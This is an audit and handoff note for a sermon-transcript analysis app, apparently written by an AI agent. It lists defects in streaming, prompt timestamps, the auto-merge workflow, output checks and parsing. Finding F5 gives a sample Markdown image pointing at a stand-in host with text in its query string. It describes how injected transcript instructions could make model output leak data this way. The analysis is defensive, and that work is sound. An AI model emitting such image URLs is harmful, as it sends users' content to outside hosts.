# Project audit and implementation handoff

Assessed 2026-09-07 at commit `1a898fe92918337462d4f310f36c7f483100c772`.

Jake requested assessment and a local handoff only. No implementation, dependency installation, paid model calls, commits, pushes, or deployment changes were performed. This file is a backlog, not authorization to deploy. Recheck the current code before acting.

## Scope and verification

Reviewed the main UI and request lifecycle, API route, transcript normalization, prompt, parsing, output health, history, configuration, metadata, privacy copy, tests, and GitHub workflows. This was a bounded source audit with synthetic local reproductions, not a penetration test or production certification. No live browser, provider, GitHub protection settings, analytics configuration, billing, or deployment verification was performed. No claim is made that earlier models could not find these issues.

Existing checks: all 74 tests passed, lint passed, production build passed. However, the installed dependency tree is stale. `npm ls --depth=0` exits with `ELSPROBLEMS`:

| Package | Installed | Lockfile |
| :--- | :--- | :--- |
| next | 16.3.2 | 16.3.3 |
| eslint-config-next | 16.3.2 | 16.3.3 |
| ai | 7.0.79 | 7.0.83 |
| @ai-sdk/google | 4.0.51 | 4.0.56 |

These passes verify the installed tree only. Before implementation, use a clean checkout or refresh dependencies with `npm ci`, then rerun tests, lint, and build. Do not change the lockfile merely to match the old installation. Consult the newly installed Next.js documentation before changing framework code.

The tests are useful pure function tests. Despite its name, `browserResilience.test.ts` does not exercise an actual browser, mounted React component, or streaming API interaction. The principal missing coverage is at the boundaries between those pieces.

## Recommended execution order

Start with F1 and F2, then F3 and F4. F5 is a small privacy hardening change. F6 through F8 are bounded correctness repairs. Keep each change independently reviewable. Avoid a large UI refactor or prompt rewrite while fixing them.

### F1: Resetting during generation leaves the previous stream active

Priority: P1. Confirmed control flow defect; browser reproduction still needed.

Evidence: `app/page.tsx:1521` disables Analyze Another Sermon only while output is empty. After the first chunk, it is enabled even while loading. `analyzeAnotherSermon` at line 1114 clears output and sets status to idle, but the controller at line 935 is local to `streamChatResponse`. The old reader continues calling `setOutput`, and `runWithText` can still save history and change status on completion.

Trigger: start a slow response, wait for its first text, then click Analyze Another Sermon. The old output can reappear after the reset. Starting another generation can let two streams overwrite one output and let one request mark the other idle. Existing demo and history guards do not protect this reset path.

Implementation: smallest repair is disable reset during loading and guard the handler. If reset is intended to cancel, keep an active request controller and generation identity in refs. Invalidate the identity on reset and gate every output, status, error, and history write on it. Abort alone does not guard already queued callbacks. Pass request cancellation to the provider where supported and verify disconnect behavior separately.

Acceptance: a mocked delayed stream cannot change output or history after reset; request A cannot overwrite request B or clear B's loading state. Verify with a mounted component or browser using mocked responses, without spending Gemini requests.

### F2: Prompt explicitly discards timestamp hours

Priority: P1. Confirmed prompt defect; frequency in live output not measured.

Evidence: `lib/systemPrompt.ts:14` says to ignore both `hh` and frames. Normalization in `lib/transcript.ts` correctly preserves hours, so the information is lost through the instruction rather than parsing.

Trigger: a source tag `[01:02:03:00]` is instructed to become `02:03` instead of the correct elapsed position of 3723 seconds. This can put long sermon chapters out of order or point at unrelated content. A chapter spanning the hour boundary exposes the same problem.

Implementation: preserve hours when converting to elapsed time. Specify one consistent output representation, such as total minutes `62:03`, and apply it to chapter and clip timestamps. Change the narrow timestamp rule and examples, not the full prompt. Add deterministic conversion or validation if introducing shared timestamp utilities.

Acceptance: fixtures at `00:59:59`, `01:00:00`, `01:02:03`, and `02:00:00` retain their elapsed positions; a clip crossing an hour has correct duration. Keep existing untimed behavior. Prompt assertion tests alone cannot establish live model adherence; any later paid comparison should be small and explicitly scoped.

### F3: Automatic merging does not bind approval to the current PR revision or author

Priority: P1 for workflow integrity. Confirmed missing checks; exploitability and external protections not verified.

Evidence: `.github/workflows/dependabot-auto-merge.yml:17` trusts successful CI and a branch name starting with `dependabot/`. Lines 43 through 53 read current commit messages, reject only an explicit major marker, and merge the current PR. There is no author check, base repository check, positive identification of supported update metadata, or binding between the tested revision and the merged revision.

Trigger: a successful older run completes after a PR update, or a non Dependabot PR uses that branch prefix. The workflow itself does not establish that the revision it merges is the one that passed. Missing update metadata is treated as permission to merge. Repository rules may independently prevent some cases; inspect them before making a security claim.

Implementation: fetch current PR metadata; require the actual Dependabot author, expected repository and base branch, and positively recognized eligible update types. Establish the tested head revision using the actual workflow event semantics, compare it with the current PR head, and use the merge command's expected head guard to close the final race. Missing or ambiguous evidence should skip merging. Keep privileges limited and do not check out or execute PR code in this privileged workflow.

Acceptance: simulated wrong author, missing metadata, major update, stale run, and a head change between inspection and merge all refuse the merge. A recognized patch or minor update at the tested head remains eligible. Verify current GitHub event fields and CLI support before implementing; do not test by merging a real PR.

### F4: Empty or truncated final sections pass the health check

Priority: P2. Reproduced locally.

Evidence: `lib/outputHealth.ts:62` checks section names only. This input returns `[]`:

```text
### Titles

### Description

### Chapters

### Clips
```

A response cut off just after the Clips heading or during the first clip can likewise pass. `app/page.tsx:1030` stores nonempty responses in history, including these apparently healthy results.

Implementation: validate section bodies and required clip fields/counts after completion. Keep incomplete output available to copy but show an explicit warning. Also distinguish a successful provider finish from a token limit finish if the response protocol is extended; text alone cannot prove completion. Do not add automatic retries as part of this small repair.

Acceptance: empty canonical bodies, only one clip, and a missing final clip field report incomplete output. Complete output and intentionally unavailable timestamps on untimed input remain valid. Broader verbatim matching and duration validation are a later increment, not a reason to delay basic completeness checks.

### F5: Generated Markdown can load arbitrary remote images

Priority: P2. Renderer behavior reproduced locally; no model injection or external request attempted.

Evidence: `app/page.tsx:108` defines Markdown overrides but no image restriction. The ReactMarkdown instances accept default image rendering. Rendering `![example](https://example.invalid/pixel?excerpt=synthetic)` with the installed renderer produces an external `<img>` and an image preload. `next.config.ts` has no image source policy.

Impact: if a transcript instruction or model output introduces an image URL, displaying the output can contact an unrelated host without a click. If the URL contains source text, that text travels in the request. This is a conditional data disclosure path, not evidence that an actual transcript was leaked. It does not require script execution.

Implementation: exclude image elements from generated Markdown at every rendering site. Images are not part of the output contract. Preserve ordinary links and readable text; do not rely on prompt prohibitions as the control.

Acceptance: mocked image Markdown in all card/fallback paths and restored history produces neither an image element nor an external request. Use synthetic text and local request interception. No network call to a real collector is needed.

### F6: Allowed equal clip bounds create an impossible strict interval

Priority: P2. Reproduced locally.

Evidence: `lib/clipRange.ts` accepts `min <= max`; both slider handlers in `app/page.tsx` allow handles to coincide. `buildSystemPrompt(60, 60, true)` says duration must fall strictly between 60 and 60 seconds, then uses inclusive wording in the following sentence.

Implementation: make the UI, parser, prompt, and validation agree. Recommended: document inclusive bounds because the current UI already permits equality, yielding an exact duration target when equal. If strict bounds are the intended product requirement, require a nonempty interval in both UI and API instead. State the chosen semantics in the change.

Acceptance: equal handles no longer yield impossible instructions. Cover equality and the 15/600 second extremes, including any clamping behavior.

### F7: Mixed heading depths defeat the section fallback

Priority: P2. Reproduced locally.

Evidence: `lib/outputParsing.ts:73` prefers any level three heading before trying level two. A response using `## Titles`, `## Description`, `## Chapters`, `## Clips`, then `### Option 1` becomes one Draft section. The nested option heading prevents the level two fallback from recovering the actual sections.

Implementation: select section boundaries based on canonical names rather than merely the presence of a heading level. Preserve the current behavior that folds individual chapter headings into Chapters. Avoid interpreting headings inside quoted source or fenced blocks as top level sections.

Acceptance: reproduce the mixed example above and assert four canonical cards plus parsed clip content. Retain existing heading drift and preamble tests.

### F8: Field aliases can silently remove words from a verbatim clip

Priority: P2. Reproduced locally.

Evidence: `lib/outputParsing.ts:167` treats every matching label as a new field, regardless of the current field or field order. This source shaped block:

```text
Title: Original title
Transcript: Opening words
Why: because we need grace
Closing words
Description: Context
Why it works: Complete thought
```

parses with `Transcript` equal to only `Opening words`. The line beginning `Why:` becomes the explanation alias; its content and Closing words are then overwritten by the real explanation. The full raw copy retains text while the visible transcript loses it.

Implementation: make field transitions context aware, with particular protection for Transcript. Narrow aliases in ambiguous positions or fall back to the raw clip when reliable parsing is impossible. Plain text has inherent ambiguity, so do not claim all collisions can be solved by another permissive regex.

Acceptance: multiline quotes beginning with `Why:`, `Time:`, or `Title:` do not silently lose words. Keep existing supported bold/alias formats. If a clip is ambiguous, preserve all original text in the fallback.

## Smaller followups and limits

1. Upload lifecycle: `handleFiles` has no active read identity or cancellation. Selecting A then B can let the slower A overwrite B. A late read can also change generation status. File validation and read errors can leave a previously accepted file selected. Reproduce with controllable FileReader callbacks, then track the current read and make pending/error behavior explicit.
2. Timeout messaging: `isAiLimitHttpStatus` treats HTTP 504 as a quota error and discards the server's useful 429 reset message. A gateway timeout does not establish quota exhaustion. Split these paths and test the visible messages with mocked responses.
3. Provider lifecycle: the API does not pass `req.signal` into `streamText`. Verify cancellation propagation against the lockfile SDK before claiming client cancellation stops paid generation. The outer catch is not evidence that asynchronous streaming failures receive that JSON response. Test early and midstream failure with a fake provider.
4. History writes: `writeHistory` can clear older persisted history when every attempted write fails, even if reads and removal still work. Consider preserving the prior persisted list and returning an explicit persistence failure. Test preexisting history plus throwing setItem and successful removeItem. Avoid destructive fallback on generic storage errors.
5. Input processing: the API reads all JSON and normalizes before applying the character limit. Existing host request limits may bound exposure, but application code does not bound raw input before allocating and processing it. Inspect actual hosting limits before assigning severity. Reject excessive raw text before normalization if implementing this guard.
6. Known constraints, not new discoveries: rate limiting is per process and not a global spend cap; recognized timestamps do not establish full timing coverage; unsupported caption shapes intentionally pass through. Do not introduce a database, global limiter, broad caption rewrite, or automatic retry system merely to clear this audit.
7. Documentation drift: AGENTS.md contains older chapter quantity guidance and a historical 5 request figure in model evaluation notes. The live prompt specifies 6 to 9 chapters, and shared limiter configuration is 20. README also omits the required API environment variable. Update instructions from current code after functional fixes, without copying credentials into documentation.

## Guidance for the next model

Preserve the Gemini model choice, real attributed frozen demo, local history ownership, and privacy boundaries. Read AGENTS.md and relevant installed framework guides. The current `app/error.tsx` use of `retry` matches the installed Next.js guide; do not replace it based on older Next.js knowledge. Avoid real sermon fixtures in new tests.

Use focused synthetic regressions and mocked streaming/browser behavior for the findings above. Run `npm test`, `npm run lint`, and `npm run build` against the refreshed dependency tree. A passing build is not browser verification. Keep source review, browser evidence, and any later live model evaluation clearly distinguished. Leave deployment and subjective visual signoff to Jake's subsequent instructions.
